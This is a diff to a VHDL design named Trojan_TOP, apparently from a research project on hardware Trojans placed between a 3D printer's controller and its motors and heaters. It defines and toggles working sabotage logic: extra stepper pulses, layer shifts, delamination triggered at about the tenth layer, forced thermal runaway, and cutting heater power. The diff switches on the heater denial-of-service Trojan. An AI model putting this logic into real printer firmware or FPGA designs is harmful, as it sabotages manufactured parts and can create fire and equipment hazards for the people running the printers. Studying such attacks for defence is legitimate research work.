@@ -91,6 +91,7 @@ architecture Behavioral of Trojan_TOP is
     constant PULSES_PER_STEP : std_logic_vector(4 downto 0) := "10000";  -- 16 pulses per step --> 1.8 degrees (?)
     constant TEN_SECONDS     : std_logic_vector(29 downto 0) := "111011100110101100101000000000"; 
     constant ONE_HUNDRED_SECONDS : std_logic_vector (33 downto 0) := "1001010100000010111110010000000000"; 
+    
     -- Modified Output Signals 
     signal X_STEP_MOD : std_logic := '0';
     signal Y_STEP_MOD : std_logic := '0';
@@ -110,16 +111,15 @@ architecture Behavioral of Trojan_TOP is
     signal E_STEP_COMPLETE : std_logic := '0';
 
     -- Temporarily we will set the enabled trojans here, hardcoded. Vivado will optimize out the unused ones.
-    signal TROJ_T1_ENABLE : std_logic := '0'; -- Adds steps from X or Y axis during move
-    signal TROJ_T2_ENABLE : std_logic := '0'; -- Constant over / under extrusion per print
-    signal TROJ_T3_ENABLE : std_logic := '0'; -- Increases or decreases filament retraction between layers
-    signal TROJ_T4_ENABLE : std_logic := '1'; -- Small Shift along X and Y axis on random Z layer increment
-    signal TROJ_T5_ENABLE : std_logic := '0'; -- Denial of service via disabling D8/D10 heating element power
-    signal TROJ_T6_ENABLE : std_logic := '0'; -- Forcing thermal runaway and further overheating
-    signal TROJ_T7_ENABLE : std_logic := '0'; -- Layer Delamination via Z-layer shift
-    signal TROJ_T8_ENABLE : std_logic := '0'; -- Arbitrarily deactivating stepper motors via EN signals
-    signal TROJ_T9_ENABLE : std_logic := '0'; -- Arbitrarily reducing part fan speed mid-print
-    signal TROJ_T10_ENABLE: std_logic := '0'; -- Arbitrarily shifting prints by actuating endstops
+    signal TROJ_T1_ENABLE : std_logic := '0'; -- Adds steps from X or Y axis during move                            -- DONE
+    signal TROJ_T2_ENABLE : std_logic := '0'; -- Constant over / under extrusion per print                          -- DONE
+    signal TROJ_T3_ENABLE : std_logic := '0'; -- Increases or decreases filament retraction between layers          -- DONE
+    signal TROJ_T4_ENABLE : std_logic := '0'; -- Small Shift along X and Y axis on random Z layer increment         -- DONE
+    signal TROJ_T5_ENABLE : std_logic := '0'; -- Forcing thermal runaway and further overheating                    -- DONE
+    signal TROJ_T6_ENABLE : std_logic := '1'; -- Denial of service via disabling D8/D10 heating element power       --
+    signal TROJ_T7_ENABLE : std_logic := '0'; -- Layer Delamination via Z-layer shift                               -- DONE
+    signal TROJ_T8_ENABLE : std_logic := '0'; -- Arbitrarily deactivating stepper motors via EN signals             --
+    signal TROJ_T9_ENABLE : std_logic := '0'; -- Arbitrarily reducing part fan speed mid-print                      --          
 
     type State_Type is (IDLE, STATE_1, STATE_2, STATE_3, STATE_4, STATE_5, DISABLE);
 
@@ -154,7 +154,7 @@ architecture Behavioral of Trojan_TOP is
     
     -- Trojan 7 Related Signals 
     signal T7_STATE, T7_NEXT_STATE: State_Type := IDLE;
-    signal TROJ_T7_Z_PULSE_COUNT : std_logic_vector (7 downto 0) := (others=>'0');
+    signal TROJ_T7_Z_PULSE_COUNT : std_logic_vector (9 downto 0) := (others=>'0');
     signal TROJ_T7_Z_STEP_COUNT  : std_logic_vector (7 downto 0) := (others=>'0');
 
     -- Trojan 8 Related Signals 
@@ -166,7 +166,6 @@ architecture Behavioral of Trojan_TOP is
     signal TROJ_T8_Z_EN_MOD  : std_logic := '0';
 
     -- Trojan 9 Related Signals    
-    -- Trojan 10 Related Signals 
     
 begin
 
@@ -203,7 +202,7 @@ begin
     -- Modify these signals as needed
     o_LED       <= OUTPUT_LED;
 
-    o_D10       <= i_D10    ; -- Extruder
+--    o_D10       <= i_D10    ; -- Extruder
     o_D9        <= i_D9     ; -- Fan
     o_D8        <= i_D8     ; -- Heat Bed
 
@@ -219,7 +218,7 @@ begin
     o_Y_DIR     <= i_Y_DIR  ;
     o_Y_EN      <= i_Y_EN   ;
     o_Y_MIN     <= i_Y_MIN  ;
---    o_Y_STEP    <= i_Y_STEP ; 
+    o_Y_STEP    <= i_Y_STEP ; 
 
     o_Z_DIR     <= i_Z_DIR  ;
     o_Z_EN      <= i_Z_EN   ;
@@ -237,17 +236,17 @@ begin
 --     o_E_STEP   <= i_E_STEP when TROJ_T3_ENABLE = '0' else (i_E_STEP or E_STEP_MOD);   
         
     -- Trojan 4 Related Signals 
-     o_Y_STEP    <= i_Y_STEP when TROJ_T4_ENABLE = '0' else (i_Y_STEP or Y_STEP_MOD);
+--     o_Y_STEP    <= i_Y_STEP when TROJ_T4_ENABLE = '0' else (i_Y_STEP or Y_STEP_MOD);
     
     -- -- Trojan 5 Related Signals 
-    -- o_D10       <= o_D10 when TROJ_T5_ENABLE = '0' else (o_D10 or TROJ_T5_D10_MOD);
-    -- o_D8        <= o_D8  when TROJ_T5_ENABLE = '0' else (o_D8  or TROJ_T5_D8_MOD);
+--     o_D10       <= i_D10 when TROJ_T5_ENABLE = '0' else (i_D10 or TROJ_T5_D10_MOD);
+--     o_D8        <= i_D8  when TROJ_T5_ENABLE = '0' else (i_D8  or TROJ_T5_D8_MOD);
 
     -- Trojan 6 Related Signals 
-    -- o_D10       <= o_D10 when TROJ_T6_ENABLE = '0' else (o_D10 and TROJ_T6_D10_MOD);
+     o_D10       <= i_D10 when TROJ_T6_ENABLE = '0' else (i_D10 and TROJ_T6_D10_MOD);
 
     -- Trojan 7 Related Signals 
-    -- o_Z_STEP    <= i_Z_STEP when TROJ_T7_ENABLE = '0' else (i_Z_STEP or Z_STEP_MOD);
+--    o_Z_STEP    <= i_Z_STEP when TROJ_T7_ENABLE = '0' else (i_Z_STEP or Z_STEP_MOD);
 
     -- Trojan 8 Related Signals 
     -- o_E_EN    <= i_E_EN when TROJ_T8_ENABLE = '0' else (i__E_EN or TROJ_T8_E_EN_MOD); 
@@ -381,7 +380,6 @@ begin
                     end if;
                 when STATE_2 => 
                     if(E_STEP_COMPLETE = '1') then
-                        OUTPUT_LED <= '1';
                         E_PULSE_EN <= '0';
                         T3_NEXT_STATE <= IDLE;
                     else 
@@ -426,12 +424,20 @@ begin
                 when STATE_2 => 
                     if(Y_STEP_COMPLETE = '1') then
                         Y_PULSE_EN <= '0';
-                        T4_NEXT_STATE <= IDLE;
+                        T4_NEXT_STATE <= STATE_3;
                     else
                         Y_PULSE_EN <= '1';
                         T4_NEXT_STATE <= STATE_2;
                     end if;
-                when STATE_3 => T4_NEXT_STATE <= DISABLE; -- Unused
+                when STATE_3 => 
+                    if(Y_STEP_COMPLETE = '1') then
+                        Y_PULSE_EN <= '0';
+                        T4_NEXT_STATE <= IDLE;
+                    else
+                        Y_PULSE_EN <= '1';
+                        T4_NEXT_STATE <= STATE_3;
+                    end if;
+                
                 when STATE_4 => T4_NEXT_STATE <= DISABLE; -- Unused
                 when STATE_5 => T4_NEXT_STATE <= DISABLE; -- Unused
 
@@ -516,6 +522,7 @@ begin
                     T6_NEXT_STATE <= STATE_3;
 
                 when STATE_3 => -- Endless Loop
+                    OUTPUT_LED <= '1';
                     T5_NEXT_STATE <= STATE_3;
 
                 when STATE_4 => T6_NEXT_STATE <= DISABLE; -- Unused
@@ -544,8 +551,8 @@ begin
                     end if;
 
                 when STATE_1 => -- Wait for a certain number of z steps
-                    if (TROJ_T7_Z_PULSE_COUNT = X"FF") then -- 255 pulses -->  Need to check layer num
-                        TROJ_T7_Z_PULSE_COUNT <= X"00";
+                    if (TROJ_T7_Z_PULSE_COUNT = "1100100000")then -- 800 pulses --> 10th layer will delaminate
+                        TROJ_T7_Z_PULSE_COUNT <=  "0000000000";
                         T7_NEXT_STATE <= STATE_2;
                     else 
                         if(Z_STEP_EDGE = '1') then
@@ -562,8 +569,8 @@ begin
                         T7_NEXT_STATE <= STATE_2;
                     end if;
 
-                when STATE_3 => -- do 16 steps --> about 1 layer
-                    if(TROJ_T7_Z_STEP_COUNT = "0001000") then
+                when STATE_3 => -- do 80 steps --> about 1 layer (16 pulses per output --> need to do it 5 times)
+                    if(TROJ_T7_Z_STEP_COUNT = "0000101") then
                         TROJ_T7_Z_STEP_COUNT <= (others=>'0');
                         T7_NEXT_STATE <= STATE_4;
                     else 
